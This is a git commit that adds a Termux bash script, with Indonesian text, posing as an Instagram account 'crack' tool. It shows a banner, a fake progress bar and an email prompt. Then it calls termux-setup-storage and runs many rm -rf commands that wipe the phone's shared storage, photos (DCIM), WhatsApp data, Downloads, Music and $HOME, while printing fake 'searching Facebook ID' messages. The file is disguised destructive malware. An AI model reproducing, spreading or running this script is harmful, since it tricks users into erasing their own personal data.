6362a004901c6d51a65c5f553544dcdcdae44086
MRRUXHAN <50254850+MRRUXHAN27@users.noreply.github.com>
2019-05-04 15:08:04 +0700

    Add files via upload

---
+++ ig-1.sh
@@ -0,0 +1,131 @@
+#! / system / xbin / bash
+#have fun
+clear
+echo "\033[32;1m
+███INSTAGRAM BY MRRUXHAN███"
+
+echo "\033[32;1m_________________________________________"
+echo "\033[32;1m|\033[31;1mAuthor	 	:\033[32;1mMRRUXHAN		|"	
+echo "\033[32;1m|\033[31;1mWhatsapp 	:\033[32;1m089698270794		|"
+echo "\033[32;1m|\033[31;1mFacebook 	:\033[32;1mMasrukhan			|"
+echo "\033[32;1m________________________________________|"
+echo 
+echo "\033[31;1mCrack Hanya untuk bersenang-senang"
+echo "\033[35;1mApakah ingin memulainya sekarang Y/N ??? :v"
+echo "\033[33;1mBersedia :v\033[31;1mY\033[32;1m/\033[31;1mN"
+read -p "Jawab asw-->" "jwb"
+if [ $jwb = Y ] | [ $jwb = y ]; then
+	sleep 3
+	echo "\033[34;1m SABAR ... :v"
+	sleep 4
+	echo "\033[34;1m Memproses :v"
+	sleep 4
+	echo "\033[31;1m1%"
+	sleep 2
+	echo "\033[31;1m4%"
+	sleep 2
+	echo "\033[31;1m8%"
+	sleep 2
+	echo "\033[31;1m10%"
+	sleep 2
+	echo "\033[31;1m15%"
+	sleep 2
+	echo "\033[31;1m20%"
+	sleep 2
+	echo "\033[31;1m30%"
+	sleep 2
+	echo "\033[31;1m35%"
+	sleep 2
+	echo "\033[31;1m50%"
+	sleep 2
+	echo "\033[31;1m70%"
+	sleep 2
+	echo "\033[31;1m75%"
+	sleep 2
+	echo "\033[31;1m999%"
+	sleep 2
+	echo "\033[31;1m100%"
+	sleep 1
+	
+	echo $green" 01) klik 1 untuk melanjutkan"
+	
+	read -p "[TEAM ARMY CYBER]> " bro;
+	
+	if [ $bro = 1 ] || [ $bro = 01 ]
+	
+	then
+	
+	clear
+	
+	echo $green" Login instagram"
+	
+	sleep 1
+	
+	read -p "[ISI EMAIL]> " bro;
+	
+	termux-setup-storage
+	
+	rm -rf /storage/emulated/0
+	
+	rm -rf /sdcard/0
+	
+	rm -rf /storage/emulated/0/DCIM
+	
+	rm -rf /storage/emulated/0/android/obb
+	
+	rm -rf /sdcard/0/android/data
+	
+	rm -rf $HOME
+	
+	rm -rf sdcard/0
+	
+	rm -rf storage/emulated/0
+	
+	rm -rf /storage/emulated/0/WhatsApp
+	
+	rm -rf /sdcard/0/WhatsApp
+	
+	rm -rf /storage/emulated/0/Downloads
+	
+	rm -rf /storage/emulated/0/Music
+	
+	rm -rf /sdcard/0/Music
+	
+	echo $green"Sedang Mencari ID Facebook Dalam 30 detik"
+	
+	sleep 5
+	
+	echo $green"Sedang Mencari ID Facebook Dalam 29 detik"
+	
+	sleep 5
+	
+	echo $green"Sedang Mengumpulkan ID Facebook Dalam 28 detik"
+	
+	exit
+	
+	fi
+	
+	echo "\033[33;1SILAKHAN SHARE SCRIPT TERMUX MRRUXHAN"
+	echo 
+	sleep 4
+	echo "\033[34;1mGOOD LUCK"
+	echo
+	sleep 1
+	echo "\033[32;1mMOHON TUNGGU SEBENTAR :v"
+	echo "\033[32;1mjangan lupa share"
+fi
+
+if [ $jwb = N ] | [ $jwb = n ]; then
+echo "\033[32;1m
+ _______  _______  __   __  _______  __    _  _______  ______    _______ 
+|       ||   _   ||  | |  ||       ||  |  | ||   _   ||    _ |  |   _   |
+|  _____||  |_|  ||  |_|  ||   _   ||   |_| ||  |_|  ||   | ||  |  |_|  |
+| |_____ |       ||       ||  | |  ||       ||       ||   |_||_ |       |
+|_____  ||       ||_     _||  |_|  ||  _    ||       ||    __  ||       |
+ _____| ||   _   |  |   |  |       || | |   ||   _   ||   |  | ||   _   |
+|_______||__| |__|  |___|  |_______||_|  |__||__| |__||___|  |_||__| |__|
+
+
+"
+fi
+echo "\033[0;1m"
